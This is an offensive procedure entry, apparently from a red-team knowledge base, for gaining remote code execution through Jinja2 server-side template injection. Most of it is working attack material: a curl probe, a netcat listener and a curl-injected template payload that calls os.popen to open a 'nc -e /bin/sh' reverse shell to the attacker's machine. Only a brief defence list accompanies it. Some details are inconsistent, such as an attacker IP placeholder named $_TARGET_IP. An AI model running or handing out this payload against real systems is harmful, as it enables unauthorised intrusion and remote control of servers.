---
id: 36b1af86-ea35-42bc-ae24-c63cfcc6b9ba
name: Jinja2-RCE-via-Server-Side-Template-Injection
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:39.733501+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - >-
    [[techniques/Command-and-Scripting-Interpreter/T1059.006|T1059.006 -
    Python]]
sub_techniques: []
tags:
  - '[[tags/Jinja2]]'
  - '[[tags/RCE]]'
  - '[[tags/SSTI]]'
  - '[[tags/Server-Side-Template-Injection]]'
commands:
  - '[[commands/curl-test-ssti]]'
  - '[[commands/curl-inject-jinja2-rce]]'
  - '[[codes/nc-listen-on-port-8000]]'
platforms:
  - Web
  - Linux
tools:
  - '[[tools/Netcat]]'
validated: true
---

# Jinja2-RCE-via-Server-Side-Template-Injection

## Summary

This procedure exploits Server-Side Template Injection (SSTI) vulnerabilities in Jinja2-templated Python web applications to achieve remote code execution (RCE). By injecting malicious template expressions into user-controlled inputs that are rendered by Jinja2, an attacker can execute arbitrary Python code on the server, leading to command execution and potentially a reverse shell connection back to the attacker's listener.

## Description

Jinja2 is a popular templating engine for Python web frameworks like Flask and Django, used to generate dynamic content by interpolating variables into HTML or other templates. SSTI occurs when user input is unsafely passed to the template renderer without proper sanitization, allowing attackers to inject Jinja2 expressions that execute during rendering. This procedure demonstrates identifying the vulnerability through boolean-based tests and escalating to RCE by accessing Python internals to spawn a reverse shell. It targets web applications exposing forms, search fields, or URL parameters that render Jinja2 templates. Success grants shell access, enabling further post-exploitation like data exfiltration or persistence.

## Requirements

1. Network access to the target web application (e.g., via browser or proxy like Burp Suite).
2. Identification of an input field (e.g., search box, profile field) that renders user input as a Jinja2 template.
3. Attacker-controlled server with netcat listener for reverse shell.
4. Basic knowledge of Python and Jinja2 syntax; tools like curl and netcat installed on the attacker's machine.
5. Optional: Intercepting proxy to modify requests.

## Defense

- Use Jinja2's safe rendering modes (e.g., autoescape=True) and avoid passing unsanitized user input to templates.
- Implement input validation to strip or escape template syntax characters like {{ }}.
- Employ web application firewalls (WAFs) to detect and block common SSTI payloads.
- Run applications in restricted environments (e.g., containers with limited privileges) to contain RCE impact.
- Monitor server logs for anomalous Python execution or network connections to unexpected IPs/ports.

## Objectives

1. Confirm SSTI vulnerability by injecting test expressions that alter output.
2. Escalate to RCE by injecting a payload that executes system commands.
3. Establish a reverse shell for interactive access to the target system.

## Instructions

### Step 1: Test for SSTI Vulnerability

**Context**: Begin by injecting a simple arithmetic expression to verify if the input is rendered as a Jinja2 template. If the output reflects the computed result (e.g., 49 instead of literal "{{7*7}}"), SSTI is confirmed. This step uses a GET request to a vulnerable endpoint, assuming a search parameter is injectable.

**Command** ([[commands/curl-test-ssti]]):
```bash
curl -G "http://target.com/search" --data-urlencode "q={{7*7}}"
```

> This curl command sends a GET request to the search endpoint with the query parameter encoded to inject the Jinja2 expression {{7*7}}. The -G flag ensures proper URL encoding. Expected output in the response body should show "49" if vulnerable, confirming template execution. If the literal string appears, the input is not rendered; try other parameters or POST requests.

### Step 2: Start Reverse Shell Listener

**Context**: Before injecting the RCE payload, set up a netcat listener on the attacker's machine to catch the incoming shell connection. This prepares for the payload execution, which will spawn a reverse shell using nc on the target.

**Command** ([[codes/nc-listen-on-port-8000]]):
```bash
nc -lnvp 8000
```

> The nc command listens on port 8000 in verbose mode without DNS resolution. Upon successful payload execution, a connection will be established, providing a shell prompt. Keep this running in a separate terminal while testing the injection.

### Step 3: Inject RCE Payload for Reverse Shell

**Context**: With SSTI confirmed and listener active, inject a payload that traverses Python's object hierarchy to access the os module and execute a system command spawning a reverse shell. This uses Jinja2's expression syntax to call popen and run nc connecting back to the attacker's IP and port. Replace $_TARGET_IP with your attacker's IP.

**Command** ([[commands/curl-inject-jinja2-rce]]):
```bash
curl -G "http://target.com/search" --data-urlencode "q={{''.__class__.__mro__[1].__subclasses__()[414].__init__.__globals__['os'].popen('nc $_TARGET_IP 8000 -e /bin/sh').read()}}"
```

> This command injects a complex Jinja2 payload that accesses the subprocess.Popen class via class introspection (index 414 may vary; test with __subclasses__() to find exact). It executes 'nc $_TARGET_IP 8000 -e /bin/sh' to create a reverse shell. Expected output: The response may show shell output or errors, but success is indicated by a connection on the netcat listener. If the index is wrong, iterate by injecting {{''.__class__.__mro__[1].__subclasses__()}} and inspecting the output for the correct class (e.g., subprocess.Popen).
